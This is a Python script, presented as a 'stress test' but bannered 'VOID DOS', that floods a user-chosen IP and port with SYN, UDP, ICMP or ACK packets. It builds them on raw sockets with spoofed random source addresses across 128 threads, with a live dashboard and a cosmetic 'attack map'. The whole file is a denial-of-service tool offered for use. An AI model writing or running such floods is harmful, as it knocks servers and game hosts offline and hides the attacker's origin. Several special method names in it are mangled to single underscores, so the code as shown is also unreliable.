#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
# ##  VOID Stress Test v2.0 — OPTIMIZED — raw socket packet engine
# ##  Kali Linux / WSL  ·  MAX SPEED · NO LAG · REAL-TIME STATS
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

def _ensure_deps():
    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet")]:
        try:
            _import_(mod)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call(
                    [sys.executable,"-m","pip","install",pkg,"-q","--break-system-packages"],
                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                subprocess.check_call(
                    [sys.executable,"-m","pip","install",pkg,"-q"],
                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

_ensure_deps()

import struct, socket, random, threading, time, re, select
from collections import deque
from functools import lru_cache
from rich.console  import Console
from rich.text     import Text
from rich.align    import Align
from rich.rule     import Rule
from rich.panel    import Panel
from rich.table    import Table
from rich.live     import Live
from rich          import box
import pyfiglet

console    = Console()
stop_event = threading.Event()

# ══════════════════════════════════════════════════════════════════
# CONFIGURATION — TUNED FOR MAX PERFORMANCE
# ══════════════════════════════════════════════════════════════════

N_THREADS       = 128      # Doubled threads for more throughput
POOL_SIZE       = 1000     # Larger pool = less regeneration
BATCH_REPORT    = 100      # Report every 100 packets (reduces lock contention)
SOCKET_BUF_SIZE = 8 * 1024 * 1024  # 8MB socket buffer
STATS_INTERVAL  = 0.05     # 50ms stats update interval

# ══════════════════════════════════════════════════════════════════
# OPTIMIZED PACKET CRAFTING ENGINE — NO RECALCULATION IN HOT PATH
# ══════════════════════════════════════════════════════════════════

@lru_cache(maxsize=1024)
def _checksum_cached(data: bytes) -> int:
    """Cached checksum for common packet sizes."""
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def _checksum(data: bytes) -> int:
    """Standard RFC-1071 Internet checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# Pre-allocated random IP pools to avoid generation overhead
_RAND_IP_POOL = []
_RAND_PORT_POOL = []

def _init_pools():
    """Initialize pools of random IPs and ports."""
    global _RAND_IP_POOL, _RAND_PORT_POOL
    for _ in range(10000):
        a = random.randint(1, 223)
        while a in (10, 127, 169, 172, 192):
            a = random.randint(1, 223)
        _RAND_IP_POOL.append(f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
    _RAND_PORT_POOL = [random.randint(1024, 65535) for _ in range(10000)]

_init_pools()

def _get_rand_ip() -> str:
    return random.choice(_RAND_IP_POOL)

def _get_rand_port() -> int:
    return random.choice(_RAND_PORT_POOL)

def _ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int, pkt_id: int = None) -> bytes:
    """Build IP header — optimized with optional cached ID."""
    ihl     = 5
    ver     = 4
    tos     = 0
    tot_len = 20 + payload_len
    pkt_id  = pkt_id if pkt_id is not None else random.randint(0, 65535)
    frag    = 0
    ttl     = random.randint(48, 128)
    chk     = 0
    src     = socket.inet_aton(src_ip)
    dst     = socket.inet_aton(dst_ip)
    hdr = struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl, tos, tot_len,
        pkt_id, frag, ttl, proto, chk, src, dst)
    chk = _checksum(hdr)
    return struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl, tos, tot_len,
        pkt_id, frag, ttl, proto, chk, src, dst)

# TCP flag constants
F_SYN = 0x002
F_ACK = 0x010
F_RST = 0x004
F_FIN = 0x001
F_PSH = 0x008

def _tcp_segment(src_ip: str, dst_ip: str, sport: int, dport: int, flags: int) -> bytes:
    """Build TCP segment — optimized."""
    seq    = random.randint(0, 2**32 - 1)
    ack_n  = 0
    doff   = 5
    win    = random.randint(1024, 65535)
    chk    = 0
    urg    = 0
    off    = (doff << 4) | 0
    seg = struct.pack('!HHIIBBHHH',
        sport, dport, seq, ack_n, off, flags, win, chk, urg)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 6, len(seg))
    chk = _checksum(pseudo + seg)
    return struct.pack('!HHIIBBHHH',
        sport, dport, seq, ack_n, off, flags, win, chk, urg)

def _udp_segment(src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    """Build UDP segment — optimized with fixed payload size."""
    data   = random.randbytes(64)  # Fixed size for speed
    length = 8 + len(data)
    chk    = 0
    seg = struct.pack('!HHHH', sport, dport, length, chk) + data
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 17, length)
    chk = _checksum(pseudo + seg[:8] + data)
    return struct.pack('!HHHH', sport, dport, length, chk) + data

def _icmp_packet() -> bytes:
    """Build ICMP packet — optimized."""
    type_   = 8
    code    = 0
    chk     = 0
    id_     = random.randint(0, 65535)
    seq     = random.randint(0, 65535)
    payload = random.randbytes(56)
    hdr = struct.pack('!BBHHH', type_, code, chk, id_, seq)
    chk = _checksum(hdr + payload)
    return struct.pack('!BBHHH', type_, code, chk, id_, seq) + payload

def _build_packet(mode_key: str, src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    """Build complete packet — optimized dispatch."""
    if mode_key == "SYN":
        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_SYN)
        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
    elif mode_key == "ACK":
        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_ACK)
        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
    elif mode_key == "UDP":
        udp = _udp_segment(src_ip, dst_ip, sport, dport)
        return _ip_header(src_ip, dst_ip, 17, len(udp)) + udp
    elif mode_key == "ICMP":
        icmp = _icmp_packet()
        return _ip_header(src_ip, dst_ip, 1, len(icmp)) + icmp
    return b''

# ══════════════════════════════════════════════════════════════════
# LOCK-FREE STATS SYSTEM — MINIMAL CONTENTION
# ══════════════════════════════════════════════════════════════════

class FastStats:
    """High-performance stats with minimal locking."""
    def _init_(self):
        self._lock = threading.Lock()
        self.sent = 0
        self.replies = 0
        self.errors = 0
        self.last_flag = ""
        self._start_time = time.time()
        self._last_sent = 0
        self._last_time = self._start_time
        self._current_pps = 0.0
        self._pps_history = deque(maxlen=10)  # 10 samples for smoothing
        
    def add_sent(self, n: int = 1):
        """Add sent packets — atomic increment."""
        with self._lock:
            self.sent += n
            
    def add_sent_batch(self, n: int):
        """Add batch of sent packets."""
        with self._lock:
            self.sent += n
            
    def add_reply(self, flag_str: str = ""):
        """Add reply — atomic."""
        with self._lock:
            self.replies += 1
            if flag_str:
                self.last_flag = flag_str
                
    def add_error(self):
        """Add error — atomic."""
        with self._lock:
            self.errors += 1
            
    def update_pps(self):
        """Calculate current PPS — call periodically."""
        now = time.time()
        with self._lock:
            elapsed = now - self._last_time
            if elapsed >= 0.1:  # Update every 100ms min
                sent_diff = self.sent - self._last_sent
                self._current_pps = sent_diff / elapsed if elapsed > 0 else 0
                self._pps_history.append(self._current_pps)
                self._last_sent = self.sent
                self._last_time = now
                
    def get_pps(self) -> float:
        """Get current PPS with smoothing."""
        with self._lock:
            if len(self._pps_history) > 0:
                return sum(self._pps_history) / len(self._pps_history)
            return self._current_pps
            
    def snapshot(self):
        """Get current stats snapshot."""
        with self._lock:
            return {
                "sent": self.sent,
                "replies": self.replies,
                "errors": self.errors,
                "last_flag": self.last_flag,
                "elapsed": time.time() - self._start_time,
                "pps": self._current_pps
            }

# ══════════════════════════════════════════════════════════════════
# ULTRA-FAST SENDER THREAD — ZERO SLEEP, MAXIMUM THROUGHPUT
# ══════════════════════════════════════════════════════════════════

def _build_massive_pool(mode_key: str, target_ip: str, target_port: int, size: int) -> list:
    """Build massive pool of packets — eliminates all per-send overhead."""
    pool = []
    for _ in range(size):
        pool.append(_build_packet(mode_key, _get_rand_ip(), target_ip, _get_rand_port(), target_port))
    return pool

def _sender_optimized(target_ip: str, target_port: int, mode_key: str, stats: FastStats, thread_id: int):
    """Optimized sender — no sleeps, no blocking, maximum speed."""
    try:
        # Create raw socket with maximum performance settings
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUF_SIZE)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # Low delay
        
        # Set non-blocking with larger timeout for batch operations
        sock.setblocking(False)
        
        dst = (target_ip, 0)
        
        # Build massive pool of pre-crafted packets
        pool = _build_massive_pool(mode_key, target_ip, target_port, POOL_SIZE)
        pool_idx = 0
        local_batch = 0
        total_local = 0
        
        # Pre-convert to bytes objects for maximum speed
        packet_buffer = pool
        
        while not stop_event.is_set():
            try:
                # Send packet directly from pool
                pkt = packet_buffer[pool_idx]
                sock.sendto(pkt, dst)
                
                pool_idx = (pool_idx + 1) % POOL_SIZE
                local_batch += 1
                total_local += 1
                
                # Report in batches to reduce lock contention
                if local_batch >= BATCH_REPORT:
                    stats.add_sent_batch(local_batch)
                    local_batch = 0
                    
                # Refresh pool periodically to vary source IPs
                if total_local % (POOL_SIZE * 50) == 0:
                    packet_buffer = _build_massive_pool(mode_key, target_ip, target_port, POOL_SIZE)
                    pool_idx = 0
                    
            except BlockingIOError:
                # Buffer full — just continue, don't sleep
                if local_batch > 0:
                    stats.add_sent_batch(local_batch)
                    local_batch = 0
                continue
            except OSError as e:
                # Network error — continue hammering
                stats.add_error()
                continue
            except Exception:
                continue
                
        # Flush remaining batch
        if local_batch > 0:
            stats.add_sent_batch(local_batch)
            
        try:
            sock.close()
        except:
            pass
            
    except PermissionError:
        console.print("\n  [bold red][!][/]  Raw sockets need root — run with sudo\n")
        stop_event.set()
    except Exception as e:
        stats.add_error()

# ══════════════════════════════════════════════════════════════════
# HIGH-SPEED REPLY LISTENER — NO TIMEOUT, NON-BLOCKING
# ══════════════════════════════════════════════════════════════════

def _listener_optimized(target_ip: str, target_port: int, mode_key: str, stats: FastStats):
    """Optimized reply listener — processes replies as fast as possible."""
    try:
        if mode_key in ("SYN", "ACK"):
            proto = socket.IPPROTO_TCP
            sock_type = socket.SOCK_RAW
        else:
            proto = socket.IPPROTO_ICMP
            sock_type = socket.SOCK_RAW
            
        # Create socket with immediate timeout
        sock = socket.socket(socket.AF_INET, sock_type, proto)
        sock.setblocking(False)
        
        # Use select for non-blocking reads
        while not stop_event.is_set():
            try:
                ready, _, _ = select.select([sock], [], [], 0.001)  # 1ms timeout
                if not ready:
                    continue
                    
                pkt, addr = sock.recvfrom(65535)
                
                if addr[0] != target_ip:
                    continue
                    
                if proto == socket.IPPROTO_TCP:
                    # Fast IP header length calculation
                    ip_ihl = (pkt[0] & 0x0f) * 4
                    if len(pkt) < ip_ihl + 20:
                        continue
                        
                    # Unpack TCP header quickly
                    tcph = struct.unpack('!HHIIBBHHH', pkt[ip_ihl:ip_ihl+20])
                    src_port = tcph[0]
                    
                    if src_port != target_port:
                        continue
                        
                    flags = tcph[5]
                    flag_str = _decode_tcp_flags(flags)
                    stats.add_reply(flag_str)
                    
                elif proto == socket.IPPROTO_ICMP:
                    if len(pkt) < 21:
                        continue
                    icmp_type = pkt[20]
                    if icmp_type == 0:
                        stats.add_reply("ECHO REPLY")
                    elif icmp_type == 3:
                        stats.add_reply("PORT UNREACH")
                        
            except BlockingIOError:
                continue
            except Exception:
                continue
                
        try:
            sock.close()
        except:
            pass
    except Exception:
        pass

def _decode_tcp_flags(flags: int) -> str:
    """Fast TCP flag decoder."""
    parts = []
    if flags & F_SYN: parts.append("SYN")
    if flags & F_ACK: parts.append("ACK")
    if flags & F_RST: parts.append("RST")
    if flags & F_FIN: parts.append("FIN")
    if flags & F_PSH: parts.append("PSH")
    return "+".join(parts) if parts else f"0x{flags:02x}"

def _flag_meaning(flag_str: str) -> str:
    """Get meaning of TCP flags."""
    if "RST" in flag_str and "ACK" in flag_str: return "Port closed / server rejected"
    if "SYN" in flag_str and "ACK" in flag_str: return "Port OPEN — server responded"
    if "RST" in flag_str:                        return "Connection reset by server"
    if "ACK" in flag_str:                        return "Server acknowledged"
    if "ECHO" in flag_str:                       return "ICMP echo reply — server alive"
    if "UNREACH" in flag_str:                    return "Port unreachable (UDP closed)"
    return flag_str

# ══════════════════════════════════════════════════════════════════
# PROGRESS BAR RENDERER
# ══════════════════════════════════════════════════════════════════

def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
    """Render progress bar."""
    filled = max(0, min(int(ratio * width), width))
    b = Text()
    b.append("█" * filled, style=col)
    b.append("░" * (width - filled), style="dim")
    return b

# ══════════════════════════════════════════════════════════════════
# OPTIMIZED LIVE DASHBOARD — 20 FPS, NO LAG
# ══════════════════════════════════════════════════════════════════

def _make_dashboard_optimized(target: str, port: int, mode: dict, stats: FastStats) -> Panel:
    """Optimized dashboard — minimal overhead."""
    snap = stats.snapshot()
    pps = stats.get_pps()
    sent = snap["sent"]
    reps = snap["replies"]
    errs = snap["errors"]
    elap = snap["elapsed"]
    last_f = snap["last_flag"]
    
    loss = ((sent - reps) / sent * 100) if sent else 100.0
    
    # Calculate ratios for bars
    rate_ratio = min(pps / 500_000, 1.0)  # Scale to 500k pps
    reply_ratio = min(reps / max(sent, 1), 1.0)
    
    col = mode["color"]
    label = mode["label"]
    
    # Build table
    t = Table.grid(padding=(0, 2))
    t.add_column()
    t.add_column()
    t.add_column()
    t.add_column()
    
    t.add_row(
        Text("TARGET", style="dim"),
        Text(f"{target}:{port}", style="bold yellow"),
        Text("MODE", style="dim"),
        Text(label, style=f"bold {col}"),
    )
    t.add_row(
        Text("SENT", style="dim"),
        Text(f"{sent:,}", style="bold white"),
        Text("RATE", style="dim"),
        Text(f"{pps:,.0f} pps", style="bold bright_red"),
    )
    t.add_row(
        Text("REPLIES", style="dim"),
        Text(f"{reps:,}", style="bold bright_green"),
        Text("LOSS", style="dim"),
        Text(f"{loss:.1f}%",
             style="bright_green" if loss < 20 else ("yellow" if loss < 60 else "bright_red")),
    )
    t.add_row(
        Text("THREADS", style="dim"),
        Text(f"{N_THREADS} active", style="bold white"),
        Text("UP", style="dim"),
        Text(f"{elap:.0f}s", style="bold white"),
    )
    
    if errs > 0:
        t.add_row(
            Text("ERRORS", style="dim red"),
            Text(f"{errs:,}", style="bold red"),
            Text("", style=""),
            Text("", style=""),
        )
    
    # Rate bar
    rate_row = Text()
    rate_row.append("  RATE   ", style="bold white")
    rate_row.append_text(_bar(rate_ratio, col=col))
    rate_row.append(f"  {pps:,.0f} pps", style=f"bold {col}")
    
    # Reply bar
    rep_row = Text()
    rep_row.append("  REPLY  ", style="bold white")
    rep_row.append_text(_bar(reply_ratio, col="bright_green"))
    rep_row.append(f"  {reps:,}", style="bold bright_green")
    
    # Last reply
    last_row = Text()
    if last_f:
        meaning = _flag_meaning(last_f)
        last_row.append("  LAST   ", style="bold white")
        last_row.append(f"{last_f}  ", style="bold yellow")
        last_row.append(f"→ {meaning}", style="dim")
    else:
        last_row.append("  LAST   ", style="bold white")
        last_row.append("waiting for reply...", style="dim")
    
    # Compose panel
    from rich.console import Group
    content = Group(
        t,
        Text(""),
        rate_row,
        rep_row,
        last_row,
        Text(""),
        Text("  [Ctrl+C to stop]", style="dim red"),
    )
    
    return Panel(
        content,
        title=f"[bold bright_red]  VOID STRESS TEST v2.0  —  MAXIMUM OVERDRIVE  [/]",
        border_style="bright_red",
        box=box.DOUBLE_EDGE,
    )

# ══════════════════════════════════════════════════════════════════
# GEOGRAPHIC ATTACK MAP — UNCHANGED
# ══════════════════════════════════════════════════════════════════

MAP_LINES = [
    "                                                                                  ",
    "       ┌───────────┐          ┌────────┐   ┌─────────────────────────┐  ┌─────┐  ",
    "       │           │          │        │   │                         │  │     │  ",
    "       │  N.AMER   │          │ EUROPE │   │         A S I A         │  │ JAP │  ",
    "       │           │          │        │   │                         │  └─────┘  ",
    "       │           │          └────────┘   │                         │           ",
    "       └───────────┘                       └─────────────────────────┘           ",
    "                                                                                  ",
    "       ┌───────────┐     ┌──────────┐                          ┌──────────────┐  ",
    "       │           │     │          │                          │              │  ",
    "       │  S.AMER   │     │  AFRICA  │                          │   OCEANIA    │  ",
    "       │           │     │          │                          │              │  ",
    "       └───────────┘     └──────────┘                          └──────────────┘  ",
    "                                                                                  ",
    "                                                                                  ",
    "                                                                                  ",
]

ATTACK_NODES = [
    (2, 10, "NAM"), (3, 14, "NAM"), (4,  8, "NAM"), (5, 12, "NAM"),
    (9,  9, "SAM"), (10,13, "SAM"), (11,  8,"SAM"),
    (2, 30, "EU"),  (3, 33, "EU"),  (4, 28, "EU"),
    (9, 27, "AFR"), (10,31, "AFR"), (11,25, "AFR"),
    (2, 46, "ASIA"),(3, 50, "ASIA"),(4, 43, "ASIA"),(5, 48, "ASIA"),
    (2, 62, "JAP"), (3, 64, "JAP"),
    (9, 58, "OCE"), (10,62, "OCE"), (11,55, "OCE"),
]

REGION_ORDER  = ["NAM","EU","ASIA","JAP","SAM","AFR","OCE"]
REGION_LABELS = {
    "NAM": "North America", "EU":  "Europe",
    "ASIA":"Asia",          "JAP": "Japan / Korea",
    "SAM": "South America", "AFR": "Africa",
    "OCE": "Oceania",
}

def _render_map(active: set) -> Text:
    """Render attack map."""
    grid = [list(row) for row in MAP_LINES]
    node_positions = {}
    for row, col, region in ATTACK_NODES:
        node_positions[(row, col)] = region in active

    txt = Text()
    for r, row in enumerate(grid):
        for c, ch in enumerate(row):
            if (r, c) in node_positions:
                if node_positions[(r, c)]:
                    txt.append("◉", style="bold bright_red")
                else:
                    txt.append("·", style="dim red")
            elif ch in "┌┐└┘─│":
                txt.append(ch, style="dim red")
            else:
                txt.append(ch, style="dim white")
        txt.append("\n")
    return txt

def show_geo_attack_map(target: str, mode_label: str, mode_color: str):
    """Display geographic attack map."""
    console.print()
    console.print(Rule("[bold bright_red]  GLOBAL ATTACK NETWORK  [/]", style="bright_red"))
    console.print()
    console.print(f"  [dim]Deploying nodes across[/] [bold bright_red]7 regions[/] "
                  f"[dim]— target:[/] [bold yellow]{target}[/]")
    console.print()

    active = set()
    MAP_HEIGHT = len(MAP_LINES)

    for i, region in enumerate(REGION_ORDER):
        active.add(region)
        n = sum(1 for _, _, r in ATTACK_NODES if r == region)
        console.print(f"  [bright_red]▶️[/]  [bold white]{REGION_LABELS[region]:<16}[/]  "
                      f"[bright_red]{n} nodes[/]  [bold bright_green][ ONLINE ][/]")
        map_txt = _render_map(active)
        console.print(Align.center(map_txt))
        time.sleep(0.3)
        if region != REGION_ORDER[-1]:
            sys.stdout.write(f"\033[{MAP_HEIGHT + 1}A")
            sys.stdout.flush()

    console.print()
    console.print(Rule("[dim red]  CONVERGENCE  [/]", style="dim red"))
    console.print()
    frames = [
        f"  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]  [bold yellow]◎ {target}[/]  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]",
        f"  [red]──  ──  ──  ──  ──  ──  ──[/]  [bold yellow]◎ {target}[/]  [red]──  ──  ──  ──  ──  ──  ──[/]",
        f"  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]  [bold yellow]◎ {target}[/]  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]",
        f"  [bold bright_red]█████████████████████████[/]  [bold yellow]◎ {target}[/]  [bold bright_red]█████████████████████████[/]",
    ]
    for frame in frames:
        console.print(frame)
        time.sleep(0.2)
    console.print()
    console.print(f"  [bold bright_red][!!!][/]  [bold white]ALL {len(ATTACK_NODES)} NODES LOCKED ON[/]  "
                  f"[bold yellow]{target}[/]  [bold {mode_color}]— {mode_label.upper()}[/]")
    console.print()
    console.print(Rule(style="bright_red"))
    console.print()

# ══════════════════════════════════════════════════════════════════
# BANNER & MENUS
# ══════════════════════════════════════════════════════════════════

def banner():
    """Display banner."""
    console.clear()
    fig = pyfiglet.figlet_format("V O I D  D O S", font="doom")
    txt = Text()
    shades = ["bright_red","red","bright_red","red","bright_red","red"]
    for i, line in enumerate(fig.splitlines()):
        txt.append(line + "\n", style=shades[i % len(shades)])
    console.print(Align.center(txt))
    console.print(Align.center(Text(
        "optimized engine  ·  zero lag  ·  max pps  ·  v2.0\n",
        style="dim red")))
    console.print(Rule(style="bright_red"))

MODES = {
    "1": {"label": "SYN Flood",  "key": "SYN",  "color": "bright_red",
          "desc":  "Fake TCP handshakes — fills connection table",
          "example": "Maximum speed SYN flood with spoofed sources"},
    "2": {"label": "UDP Flood",  "key": "UDP",  "color": "bright_cyan",
          "desc":  "Random UDP datagrams — bandwidth saturation",
          "example": "High-volume UDP flood for bandwidth exhaustion"},
    "3": {"label": "ICMP Flood", "key": "ICMP", "color": "yellow",
          "desc":  "Rapid ICMP echo requests — network overwhelm",
          "example": "ICMP flood for maximum packet rate"},
    "4": {"label": "ACK Flood",  "key": "ACK",  "color": "bright_magenta",
          "desc":  "Fake TCP acknowledgements — firewall confusion",
          "example": "ACK flood to bypass stateful inspection"},
}

def show_mode_menu():
    """Display mode selection menu."""
    console.print()
    console.print(Rule("[dim red]  SELECT FLOOD TYPE  [/]", style="dim red"))
    console.print()
    for num, m in MODES.items():
        console.print(f"  [bright_red][{num}][/]  [bold {m['color']}]{m['label']}[/]")
        console.print(f"       [dim]{m['desc']}[/]")
        console.print(f"       [dim italic]\"{m['example']}\"[/]")
        console.print()

def resolve(target: str) -> str:
    """Resolve hostname to IP."""
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        return target
    try:
        ip = socket.gethostbyname(target)
        console.print(f"  [dim]Resolved:[/]  [bold yellow]{target}[/] → [bright_white]{ip}[/]")
        return ip
    except Exception:
        return target

# ══════════════════════════════════════════════════════════════════
# OPTIMIZED MAIN ATTACK LOOP — MAXIMUM PERFORMANCE
# ══════════════════════════════════════════════════════════════════

def run_optimized(target: str, port: int, mode: dict):
    """Optimized attack loop — maximum speed, no lag."""
    stats = FastStats()
    mode_key = mode["key"]
    col = mode["color"]
    label = mode["label"]
    
    # Spawn optimized sender threads
    senders = []
    for i in range(N_THREADS):
        t = threading.Thread(
            target=_sender_optimized,
            args=(target, port, mode_key, stats, i),
            daemon=True
        )
        t.start()
        senders.append(t)
    
    # Spawn optimized reply listener
    lt = threading.Thread(
        target=_listener_optimized,
        args=(target, port, mode_key, stats),
        daemon=True
    )
    lt.start()
    
    # Stats updater thread — calculates PPS in background
    def _stats_updater():
        while not stop_event.is_set():
            stats.update_pps()
            time.sleep(0.05)  # 20 FPS stats update
            
    threading.Thread(target=_stats_updater, daemon=True).start()
    
    # Input watcher
    def _input_watch():
        while not stop_event.is_set():
            try:
                import select as sel
                ready, _, _ = sel.select([sys.stdin], [], [], 0.1)
                if ready:
                    line = sys.stdin.readline().strip().lower()
                    if line == "stop":
                        stop_event.set()
            except:
                pass
    threading.Thread(target=_input_watch, daemon=True).start()
    
    # Live dashboard at 20 FPS
    try:
        from rich.console import Group
        with Live(
            console=console,
            refresh_per_second=20,  # 20 FPS for smooth updates
            screen=False,
        ) as live:
            while not stop_event.is_set():
                panel = _make_dashboard_optimized(target, port, mode, stats)
                live.update(panel)
                time.sleep(0.05)  # 50ms sleep between updates
                
    except KeyboardInterrupt:
        stop_event.set()
        
    # Wait for threads to finish
    for t in senders:
        t.join(timeout=2.0)
        
    # Final summary
    snap = stats.snapshot()
    pps = stats.get_pps()
    sent = snap["sent"]
    reps = snap["replies"]
    elap = snap["elapsed"]
    loss = ((sent - reps) / sent * 100) if sent else 100.0
    pps_a = sent / elap if elap else 0
    
    console.print()
    console.print(Rule("[bold bright_red]  SESSION SUMMARY  [/]", style="bright_red"))
    console.print()
    console.print(f"  [dim]Target          [/]  [bold yellow]{target}:{port}[/]")
    console.print(f"  [dim]Mode            [/]  [bold {col}]{label}[/]")
    console.print(f"  [dim]Engine          [/]  [bold white]Optimized raw sockets ({N_THREADS} threads)[/]")
    console.print(f"  [dim]Packets sent    [/]  [bold white]{sent:,}[/]")
    console.print(f"  [dim]Replies received[/]  [bold white]{reps:,}[/]")
    console.print(f"  [dim]Packet loss     [/]  "
                  f"[{'bright_green' if loss<20 else 'bright_red'}]{loss:.1f}%[/]")
    console.print(f"  [dim]Avg rate        [/]  [bold white]{pps_a:,.0f} pps[/]")
    console.print(f"  [dim]Peak rate       [/]  [bold white]{pps:,.0f} pps[/]")
    console.print(f"  [dim]Duration        [/]  [bold white]{elap:.1f}s[/]")
    console.print()
    
    if loss >= 80:
        v = "[bold bright_red]Server dropped most packets — firewall or port closed[/]"
    elif loss >= 40:
        v = "[bold yellow]Server struggling — high packet loss detected[/]"
    elif reps > 0 and loss < 20:
        v = "[bold bright_green]Server responding — packets getting through[/]"
    else:
        v = "[bold dim]No significant reply data captured[/]"
        
    console.print(f"  [dim]Verdict  [/]  {v}")
    console.print()
    console.print(Rule(style="bright_red"))

# ══════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════

def main():
    """Main entry point."""
    # Root check
    if os.geteuid() != 0:
        banner()
        console.print(f"\n  [bold red][!][/]  Raw sockets need root.\n"
                      f"  [dim]Fix:  sudo python3 void_ddos.py[/]\n")
        return
        
    banner()
    console.print()
    
    # Target
    console.print("  [bright_red]◈[/]  ", end="")
    target = input("Target IP or hostname: ").strip()
    if not target:
        console.print("  [red]No target. Abort.[/]"); return
    target = resolve(target)
    
    # Port
    console.print("  [bright_red]◈[/]  ", end="")
    port_raw = input("Port (default 80, Minecraft = 25565): ").strip()
    port = int(port_raw) if port_raw.isdigit() else 80
    
    # Mode
    show_mode_menu()
    console.print("  [bright_red]◈[/]  ", end="")
    choice = input("Choice (1-4, default 1): ").strip()
    mode = MODES.get(choice, MODES["1"])
    
    # Confirm
    console.print()
    console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
    console.print(f"  [dim]Target [/]  [bold yellow]{target}:{port}[/]")
    console.print(f"  [dim]Mode   [/]  [bold {mode['color']}]{mode['label']}[/]  "
                  f"[dim]— {mode['desc']}[/]")
    console.print(f"  [dim]Engine [/]  [bold white]Optimized v2.0 · {N_THREADS} threads · MAX PPS[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ", end="")
    confirm = input("Start? (Y/N): ").strip().lower()
    if confirm not in ("y", "yes"):
        console.print("\n  [yellow]Aborted.[/]\n"); return
        
    # Geo attack map
    show_geo_attack_map(target, mode["label"], mode["color"])
    
    # Countdown
    for i in range(3, 0, -1):
        console.print(f"\r  [bold bright_red][!][/]  [bold white]Firing in [bright_red]{i}[/]...[/]", end="")
        time.sleep(0.5)
    console.print(f"\r  [bold bright_red][!!!][/]  [bold bright_red]FIRING — {N_THREADS} THREADS — MAXIMUM OVERDRIVE    [/]")
    console.print()
    
    try:
        run_optimized(target, port, mode)
    except KeyboardInterrupt:
        stop_event.set()
        console.print("\n  [yellow]Stopped.[/]\n")

if _name_ == "_main_":
    try:
        main()
    except Exception as e:
        console.print(f"\n  [bold red][!][/]  {e}\n")
